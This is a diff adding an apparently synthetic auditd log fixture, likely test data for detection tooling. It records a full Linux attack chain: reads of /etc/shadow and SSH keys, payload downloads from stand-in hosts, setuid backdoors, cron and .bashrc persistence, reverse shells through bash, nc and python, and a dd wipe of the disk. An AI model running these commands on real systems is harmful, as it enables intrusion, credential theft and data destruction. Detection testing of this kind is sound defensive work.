@@ -1,0 +1,63 @@
+type=SYSCALL msg=audit(1726459672.000:100): pid=1001 uid=1000 exe=/usr/bin/id comm=id
+type=EXECVE msg=audit(1726459672.000:100): argc=1 a0=id
+type=CWD msg=audit(1726459672.000:100): cwd=/home/user
+type=SYSCALL msg=audit(1726459672.500:101): pid=1002 uid=1000 exe=/sbin/ifconfig comm=ifconfig
+type=EXECVE msg=audit(1726459672.500:101): argc=1 a0=ifconfig
+type=CWD msg=audit(1726459672.500:101): cwd=/home/user
+type=SYSCALL msg=audit(1726459673.000:102): pid=1003 uid=1000 exe=/bin/ps comm=ps
+type=EXECVE msg=audit(1726459673.000:102): argc=2 a0=ps a1=aux
+type=CWD msg=audit(1726459673.000:102): cwd=/home/user
+type=SYSCALL msg=audit(1726459673.500:103): pid=1004 uid=1000 exe=/usr/bin/crontab comm=crontab
+type=EXECVE msg=audit(1726459673.500:103): argc=2 a0=crontab a1=-l
+type=CWD msg=audit(1726459673.500:103): cwd=/home/user
+type=SYSCALL msg=audit(1726459674.000:104): pid=1005 uid=1000 exe=/usr/bin/sudo comm=sudo
+type=EXECVE msg=audit(1726459674.000:104): argc=2 a0=sudo a1=-l
+type=CWD msg=audit(1726459674.000:104): cwd=/home/user
+type=SYSCALL msg=audit(1726459674.500:105): pid=1006 uid=1000 exe=/usr/bin/find comm=find
+type=EXECVE msg=audit(1726459674.500:105): argc=5 a0=find a1=/ a2=-perm a3=-4000 a4="-type f"
+type=CWD msg=audit(1726459674.500:105): cwd=/home/user
+type=SYSCALL msg=audit(1726459675.000:106): pid=1007 uid=0 exe=/bin/cat comm=cat
+type=EXECVE msg=audit(1726459675.000:106): argc=2 a0=cat a1=/etc/shadow
+type=CWD msg=audit(1726459675.000:106): cwd=/root
+type=SYSCALL msg=audit(1726459675.500:107): pid=1008 uid=1000 exe=/bin/cat comm=cat
+type=EXECVE msg=audit(1726459675.500:107): argc=2 a0=cat a1=/home/user/.ssh/id_rsa
+type=CWD msg=audit(1726459675.500:107): cwd=/home/user
+type=SYSCALL msg=audit(1726459676.000:108): pid=1010 uid=1000 exe=/usr/bin/curl comm=curl
+type=EXECVE msg=audit(1726459676.000:108): argc=4 a0=curl a1=-o a2=/tmp/payload.sh a3=http://evil.example.com/payload.sh
+type=CWD msg=audit(1726459676.000:108): cwd=/tmp
+type=SYSCALL msg=audit(1726459676.500:109): pid=1011 uid=0 exe=/bin/chmod comm=chmod
+type=EXECVE msg=audit(1726459676.500:109): argc=3 a0=chmod a1=+s a2=/tmp/backdoor
+type=CWD msg=audit(1726459676.500:109): cwd=/tmp
+type=SYSCALL msg=audit(1726459677.000:110): pid=1012 uid=0 exe=/tmp/backdoor comm=backdoor
+type=EXECVE msg=audit(1726459677.000:110): argc=1 a0=/tmp/backdoor
+type=CWD msg=audit(1726459677.000:110): cwd=/tmp
+type=SYSCALL msg=audit(1726459677.500:111): pid=1013 uid=1000 exe=/bin/bash comm=bash
+type=EXECVE msg=audit(1726459677.500:111): argc=3 a0=bash a1=-c a2="echo "curl http://c2.evil.com/beacon|bash" >> /home/user/.bashrc"
+type=CWD msg=audit(1726459677.500:111): cwd=/home/user
+type=SYSCALL msg=audit(1726459678.000:112): pid=1014 uid=0 exe=/bin/bash comm=bash
+type=EXECVE msg=audit(1726459678.000:112): argc=3 a0=bash a1=-c a2="echo "* * * * * root /tmp/backdoor" > /etc/cron.d/evil"
+type=CWD msg=audit(1726459678.000:112): cwd=/tmp
+type=SYSCALL msg=audit(1726459678.500:113): pid=1015 uid=1000 exe=/bin/bash comm=bash
+type=EXECVE msg=audit(1726459678.500:113): argc=3 a0=bash a1=-c a2="echo "ssh-rsa AAAA... attacker" >> /home/user/.ssh/authorized_keys"
+type=CWD msg=audit(1726459678.500:113): cwd=/home/user
+type=SYSCALL msg=audit(1726459679.000:114): pid=1016 uid=0 exe=/bin/bash comm=bash
+type=EXECVE msg=audit(1726459679.000:114): argc=3 a0=bash a1=-c a2="cp /tmp/evil.service /etc/systemd/system/evil.service"
+type=CWD msg=audit(1726459679.000:114): cwd=/tmp
+type=SYSCALL msg=audit(1726459679.500:115): pid=1017 uid=1000 exe=/bin/bash comm=bash
+type=EXECVE msg=audit(1726459679.500:115): argc=3 a0=bash a1=-c a2="LD_PRELOAD=/tmp/evil.so /usr/bin/sudo -l"
+type=CWD msg=audit(1726459679.500:115): cwd=/tmp
+type=SYSCALL msg=audit(1726459680.000:116): pid=3847 uid=1000 exe=/bin/bash comm=bash
+type=EXECVE msg=audit(1726459680.000:116): argc=3 a0=bash a1=-i a2="bash -i >& /dev/tcp/192.168.1.10/4444 0>&1"
+type=CWD msg=audit(1726459680.000:116): cwd=/home/user
+type=SYSCALL msg=audit(1726459680.500:117): pid=3850 uid=1000 exe=/bin/nc comm=nc
+type=EXECVE msg=audit(1726459680.500:117): argc=4 a0=nc a1=-e a2=/bin/bash a3="192.168.1.10 4444"
+type=CWD msg=audit(1726459680.500:117): cwd=/tmp
+type=SYSCALL msg=audit(1726459681.000:118): pid=3851 uid=1000 exe=/usr/bin/python3 comm=python3
+type=EXECVE msg=audit(1726459681.000:118): argc=3 a0=python3 a1=-c a2="import socket,os,pty;s=socket.socket();s.connect(("192.168.1.10",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")"
+type=CWD msg=audit(1726459681.000:118): cwd=/home/user
+type=SYSCALL msg=audit(1726459681.500:119): pid=3852 uid=1000 exe=/usr/bin/curl comm=curl
+type=EXECVE msg=audit(1726459681.500:119): argc=3 a0=curl a1=http://evil.example.com/exploit.sh a2="| bash"
+type=CWD msg=audit(1726459681.500:119): cwd=/home/user
+type=SYSCALL msg=audit(1726459682.000:120): pid=1020 uid=0 exe=/bin/dd comm=dd
+type=EXECVE msg=audit(1726459682.000:120): argc=3 a0=dd a1=if=/dev/zero a2=of=/dev/sda
+type=CWD msg=audit(1726459682.000:120): cwd=/root
